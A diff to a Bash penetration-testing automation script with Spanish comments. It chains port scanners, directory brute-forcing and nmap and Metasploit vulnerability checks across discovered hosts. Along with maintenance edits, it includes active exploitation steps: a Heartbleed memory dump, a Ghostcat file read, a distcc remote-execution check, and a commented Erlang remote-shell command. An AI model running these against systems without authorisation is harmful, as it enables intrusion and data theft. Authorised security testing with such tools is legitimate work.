@@ -129,24 +129,29 @@ function enumeracionDefecto () {
    proto=$1
    host=$2
    port=$3     
-   echo -e "\t[+] Default enumeration ($proto : $host : $port)"	
+   echo -e "\t[+] Default enumeration ($proto : $host : $port)"
 
-	if [ "$MODE" != "proxy" ]; then 
-		echo -e "\t\t[+] Revisando folders ($host - default)"						
-		web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt 
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 
+    egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" .enumeracion/"$host"_"$port"_webData.txt 
+	greprc=$?
+	if [[ $greprc -eq 0  ]];then
+		
+		if [ "$MODE" != "proxy" ]; then 
+			echo -e "\t\t[+] Revisando folders ($host - default)"						
+			web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt 
+			egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 
 
-		echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
-		web-buster.pl -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
-		egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  
-		sleep 1 
-	fi  
-	
-	echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"						
-    $proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt
-    egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt >> .enumeracion/"$host"_"$port"_webadmin.txt
-    sleep 1
-    
+			echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
+			web-buster.pl -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
+			egrep --color=never "^200|^301|^302|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  
+			sleep 1 
+		fi  
+		
+		echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"						
+		$proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt
+		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt >> .enumeracion/"$host"_"$port"_webadmin.txt
+		sleep 1
+
+	fi		
 }
 
 function enumeracionSharePoint () {
@@ -191,14 +196,14 @@ function enumeracionIIS () {
         echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
         echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
         $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 					
-        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
+        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
     
     fi
 
     echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
     echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
     $proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
-    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
 
     echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
     $proxychains web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_iis_webadmin.txt
@@ -223,7 +228,7 @@ function enumeracionIIS () {
 
 		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
 		web-buster.pl -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto -q 1 > logs/vulnerabilidades/"$host"_iis_backupWeb.txt
-		egrep --color=never "^200|^301|^302|^401"logs/vulnerabilidades/"$host"_iis_backupWeb.txt  >> .vulnerabilidades/"$host"_iis_webarchivos.txt 
+		egrep --color=never "^200|^301|^302|^401" logs/vulnerabilidades/"$host"_iis_backupWeb.txt  >> .vulnerabilidades/"$host"_iis_webarchivos.txt 
 		sleep 1	
 
 		$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_iis_shortname.txt 2>/dev/null							   
@@ -308,7 +313,7 @@ function enumeracionApache () {
 		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
 		echo "$proxychains  nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
 		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
+		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
 	fi
 
 	if [ $internet == "n" ]; then 
@@ -393,7 +398,7 @@ function enumeracionCMS () {
 
     echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
     $proxychains nmap -n -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
-    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
     sleep 1
 
     #######  drupal (domain) ######
@@ -555,7 +560,7 @@ function testSSL ()
     greprc=$?
     if [[ $greprc -eq 0 ]] ; then						
         echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
-        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
+        grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
         $proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt
         $proxychains heartbleed.sh $host $port &
     else							
@@ -1071,8 +1076,8 @@ echo -e "#################### Escaneo de puertos TCP ######################"
 ## NAABU
 if [[ $port_scanner = "naabu" ]] || [ $port_scanner == "nmap_naabu" ]; then 
 	echo "USANDO NAABU COMO PORT SCANNER"
-	echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
-	naabu -list $live_hosts -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -c 5 -o .escaneo_puertos/tcp-especificos.txt
+	#echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  
+	#naabu -list $live_hosts -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -c 5 -o .escaneo_puertos/tcp-especificos.txt
 
     
 	echo -e "[+] Realizando escaneo tcp (Todos los puertos)" 
@@ -1098,7 +1103,7 @@ if [[ $port_scanner = "nmap" ]] || [ $port_scanner == "nmap_masscan" ] || [ $por
 				if [[ $nmap_instances -lt $max_nmap_instances  ]];then 										
 					echo -e "[+] Escaneando $ip"	
 					
-					proxychains nmap -sT -Pn -T4 --top-ports 100 -n --open  --host-timeout 60  --min-parallelism 100 --min-rate 1 $ip -oG .escaneo_puertos/$ip.proxy-nmap &
+					proxychains nmap -sT -Pn -T4 --top-ports 100 -n --open  --host-timeout 600  --min-parallelism 100 --min-rate 1 $ip -oG .escaneo_puertos/$ip.proxy-nmap &
 					sleep 0.1;
 					break												
 				else				
@@ -1128,11 +1133,12 @@ if [[ $port_scanner = "nmap" ]] || [ $port_scanner == "nmap_masscan" ] || [ $por
 		echo -e "[+] Realizando escaneo de puertos especificos (informix, Web services)"  			
 		nmap -iL  $live_hosts -Pn -p 11211,1433,1521,1525,1526,1530,17001,27017,3269,32764,37777,464,47001,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5432,593,5985,5986,6379,81,82,8291,83,84,85,8728,24007,49152,44134,50030,50060,50070,50075,50090 -oG .escaneo_puertos/tcp-especificos-nmap.grep	 
 		# parsear salida nmap  --> 200.87.68.149:443 
-		egrep -v "^#|Status: Up" .escaneo_puertos/tcp-especificos-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-especificos.txt
+		nmap-grep.sh .escaneo_puertos/tcp-especificos-nmap.grep  >> .escaneo_puertos/tcp-especificos.txt
 			
 		echo -e "[+] Realizando escaneo tcp (solo 1000 puertos)" 			
-		nmap -Pn -iL  $live_hosts --host-timeout 60 --min-parallelism 100  -oG .escaneo_puertos/tcp-1000-nmap.grep
-		egrep -v "^#|Status: Up" .escaneo_puertos/tcp-1000-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-ports.txt
+		nmap -Pn -n -iL  $live_hosts --min-parallelism 100  -oG .escaneo_puertos/tcp-1000-nmap.grep
+		#egrep -v "^#|Status: Up" .escaneo_puertos/tcp-1000-nmap.grep | cut -d' ' -f2,4- | sed -n -e 's/Ignored.*//p'  | awk '{for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%s:%s\n" , $1, v[1]}; a="" }' | sed 's/ //g'  >>  .escaneo_puertos/tcp-ports.txt
+		nmap-grep.sh .escaneo_puertos/tcp-1000-nmap.grep >> .escaneo_puertos/tcp-ports.txt
 	fi
 		
 fi
@@ -1143,13 +1149,18 @@ if [[ $port_scanner = "masscan" ]] || [ $port_scanner == "nmap_masscan" ]; then
 	if [ "$MODE" != "proxy" ]; then 
 		echo "USANDO MASSCAN COMO PORT SCANNER"		    
 		echo -e "[+] Realizando escaneo tcp (puertos 1-10514)" 	
-		#masscan --interface $iface -p1-15514 --rate=150 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
-		masscan --interface $iface -p1-10514 --rate=80 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
+
+		if [[ $total_hosts -lt 50  ]];then 
+			masscan --interface $iface -p1-10514 --rate=120 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
+		else
+			masscan --interface $iface -p22,23,389,88,636,445,1525,1530,1526,1521,1630,27017,28017,27080 --rate=50 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
+		fi	
 		cat .escaneo_puertos/mass-scan.txt | awk '{print $6 ":" $4}' | cut -d "/" -f1 >> .escaneo_puertos/tcp-ports.txt 
 	fi
 fi
 		
-cat .escaneo_puertos/tcp-especificos.txt  .escaneo_puertos/tcp-ports.txt | sort | uniq >  .escaneo_puertos/tcp.txt
+cat .escaneo_puertos/tcp-especificos.txt  .escaneo_puertos/tcp-ports.txt | sort | uniq >  .escaneo_puertos/tcp.txt 
+sed -i "s/ //g" .escaneo_puertos/tcp.txt
    
 
 ################### UDP escaneo  ###################  
@@ -1181,7 +1192,7 @@ sort .escaneo_puertos/udp2.txt | uniq > .escaneo_puertos/udp.txt
 cd .escaneo_puertos	
 	echo -e "[+] Ordernar IPs por servicio"  
 	grep ":79$" tcp.txt  | uniq >> ../servicios/finger.txt	
-	grep ":80$" tcp.txt  | uniq >> ../servicios/web2.txt	
+	grep ":80$" tcp.txt  | uniq > ../servicios/web2.txt	
 	grep ":81$" tcp.txt  | uniq >> ../servicios/web2.txt	
 	grep ":82$" tcp.txt  | uniq >> ../servicios/web2.txt	
 	grep ":83$" tcp.txt  | uniq >> ../servicios/web2.txt	
@@ -1211,7 +1222,7 @@ cd .escaneo_puertos
 	grep ":10443$" tcp.txt  | uniq >> ../servicios/web-ssl2.txt	
 	
 		
-	grep ":21$" tcp.txt  | uniq >> ../servicios/ftp2.txt
+	grep ":21$" tcp.txt  | uniq > ../servicios/ftp2.txt
 	grep ":513$" tcp.txt  | uniq >> ../servicios/rlogin.txt
 
 	
@@ -1365,25 +1376,22 @@ cd .escaneo_puertos
 	grep ":50075$" tcp.txt  | uniq >> ../servicios/hadoop-datanode.txt
 	grep ":50090$" tcp.txt  | uniq >> ../servicios/hadoop-secondary.txt
 	
-	cat ../servicios/printers.txt ../servicios/voip.txt 2>/dev/null | cut -d ":" -f1 | sort | uniq > ../servicios/no-web-ip.txt
+	########### Delete printers/ipcameras/voip from web servers list ######3
+	cat ../servicios/printers.txt ../servicios/voip.txt ../servicios/camaras-ip.txt 2>/dev/null | cut -d ":" -f1 | sort | uniq > ../servicios/no-web-ip.txt
 	for line in $(cat ../servicios/no-web-ip.txt); do
 		grep $line ../servicios/web2.txt >> ../servicios/no-web.txt
 		grep $line ../servicios/web-ssl2.txt >> ../servicios/no-web.txt
+		grep $line ../servicios/ftp2.txt >> ../servicios/no-web.txt
 	done
 	sort ../servicios/no-web.txt -o ../servicios/no-web.txt 2>/dev/null
 	sort ../servicios/web2.txt -o ../servicios/web2.txt 2>/dev/null
 	sort ../servicios/web-ssl2.txt -o ../servicios/web-ssl2.txt 2>/dev/null
 	sort ../servicios/ftp2.txt -o ../servicios/ftp2.txt 2>/dev/null
-
-
-	# Delete printers from web servers list
-#	echo "order web2"
-	comm -13 ../servicios/no-web.txt ../servicios/web2.txt > ../servicios/web.txt 2>/dev/null
-#	echo "order web-ssl2"
-	comm -13 ../servicios/no-web.txt ../servicios/web-ssl2.txt > ../servicios/web-ssl.txt 2>/dev/null
-#	echo "order ftp2"
-	comm -13 ../servicios/no-web.txt ../servicios/ftp2.txt > ../servicios/ftp.txt 2>/dev/null
 	
+	comm -13 ../servicios/no-web.txt ../servicios/web2.txt > ../servicios/web.txt 2>/dev/null
+	comm -13 ../servicios/no-web.txt ../servicios/web-ssl2.txt > ../servicios/web-ssl.txt 2>/dev/null
+	comm -13 ../servicios/no-web.txt ../servicios/ftp2.txt > ../servicios/ftp.txt 2>/dev/null
+	#######################
 cd ..
 
   
@@ -1647,7 +1655,7 @@ if [ -f servicios/iscsi.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		
 		$proxychains nmap -n -sT -Pn --script=iscsi-info -p $port $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_"$port"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_"$port"_info.txt 
 
 		$proxychains iscsiadm -m discovery -t sendtargets -p $ip:$port > logs/enumeracion/"$ip"_"$port"_discovery.txt 
 		#iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
@@ -1691,7 +1699,7 @@ if [ -f servicios/distccd.txt ]
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 		$proxychains  nmap -n -Pn --script=distcc-exec -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_rce.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
 		
 	done
 
@@ -1732,7 +1740,7 @@ if [ -f servicios/erlang.txt ]
 		port=`echo $line | cut -f2 -d":"`
 
 		$proxychains nmap -sT -Pn -n -p $port --script epmd-info $ip >> logs/enumeracion/"$ip"_"erlang"_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_"erlang"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_"erlangt"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"erlang"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_"erlangt"_info.txt 
 		
 		#erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
 		#os:cmd("id").
@@ -1804,7 +1812,7 @@ if [ -f servicios/RabbitMQ.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "$proxychains  nmap -Pn -n -sT --script=amqp-info -p $port $ip" > logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
 		$proxychains  nmap -Pn -n -sT --script=amqp-info -p $port $ip >> logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_"RabbitMQ"_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_"RabbitMQ"_info.txt 
 
 	done
 
@@ -1821,7 +1829,7 @@ if [ -f servicios/cassandra.txt ]
 
 		echo "$proxychains  nmap -Pn -n -sT --script=cassandra-info  -p $port $ip" > logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
 		$proxychains nmap -Pn -n -sT --script=cassandra-info  -p $port $ip >> logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_cassandra_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_cassandra_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_cassandra_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_cassandra_info.txt 
 
 		# cqlsh <IP>
 		# #Basic info enumeration
@@ -1851,7 +1859,7 @@ if [ -f servicios/NDMP.txt ]
 
 		echo "$proxychains  nmap -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip" > logs/enumeracion/"$ip"_NDMP_info.txt 2>/dev/null
 		$proxychains nmap -sT -n -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip >> logs/vulnerabilidades/"$ip"_NDMP_info.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .vulnerabilidades/"$ip"_NDMP_info.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .vulnerabilidades/"$ip"_NDMP_info.txt 
 		
 	done
 
@@ -1867,7 +1875,7 @@ if [ -f servicios/ajp13.txt ]
 
 		echo "$proxychains  nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
 		$proxychains nmap -sT -n -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_ajp13_proxyAuth.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_ajp13_proxyAuth.txt 
 		
 		$proxychains ghostcat.py -p $port -f /WEB-INF/web.xml $ip | strings > logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt 
 		egrep -iq "web-app" logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt
@@ -1948,7 +1956,7 @@ if [ -f servicios/EtherNet.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "$proxychains  nmap -n -Pn --script=enip-info -p $port $ip" > logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
 		$proxychains nmap -sT -n -Pn --script=enip-info -p $port $ip >> logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .vulnerabilidades/"$ip"_EtherNet_info.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .vulnerabilidades/"$ip"_EtherNet_info.txt
 
 		$proxychains python3 -m cpppo.server.enip.list_services --list-identity -a $ip > logs/vulnerabilidades/"$ip"_EtherNet_services.txt
 	done
@@ -1965,7 +1973,7 @@ fi
 # 		port=`echo $line | cut -f2 -d":"`
 # 		echo "$proxychains  nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip" > logs/enumeracion/"$ip"_BACNet_info.txt
 # 		nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip >> logs/enumeracion/"$ip"_BACNet_info.txt
-# 		grep --color=never "|" logs/enumeracion/"$ip"_BACNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_BACNet_info.txt
+# 		grep --color=never "|" logs/enumeracion/"$ip"_BACNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_BACNet_info.txt
 
 # 	done
 
@@ -1980,7 +1988,7 @@ if [ -f servicios/hadoop-jobtracker.txt ]
 		port=`echo $line | cut -f2 -d":"`
 		echo "$proxychains  nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_jobtracker.txt
 		$proxychains nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_jobtracker.txt
-		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_hadoop_jobtracker.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_hadoop_jobtracker.txt		
 	done
 
 	insert_data
@@ -1996,7 +2004,7 @@ if [ -f servicios/hadoop-namenode.txt ]
 		
  		echo "$proxychains  nmap -n -Pn --script hadoop-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_namenode.txt
 		$proxychains nmap -n -Pn --script hadoop-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_namenode.txt
-		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_namenode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_hadoop_namenode.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_namenode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_hadoop_namenode.txt		
 	done
 
 	insert_data
@@ -2011,7 +2019,7 @@ if [ -f servicios/hadoop-datanode.txt ]
 		
  		echo "$proxychains  nmap -n -Pn --script hadoop-datanode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_datanode.txt
 		$proxychains nmap -n -Pn --script hadoop-datanode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_datanode.txt
-		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_datanode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_hadoop_datanode.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_datanode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_hadoop_datanode.txt		
 	done
 	insert_data
 fi
@@ -2026,7 +2034,7 @@ if [ -f servicios/hadoop-secondary.txt ]
 		
  		echo "$proxychains  nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_secondary.txt
 		$proxychains nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_secondary.txt
-		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_secondary.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_hadoop_secondary.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_secondary.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_hadoop_secondary.txt		
 	done
 	insert_data
 fi
@@ -2042,7 +2050,7 @@ if [ -f servicios/hadoop-tasktracker.txt ]
 		
  		echo "$proxychains  nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_tasktracker.txt
 		$proxychains nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_tasktracker.txt
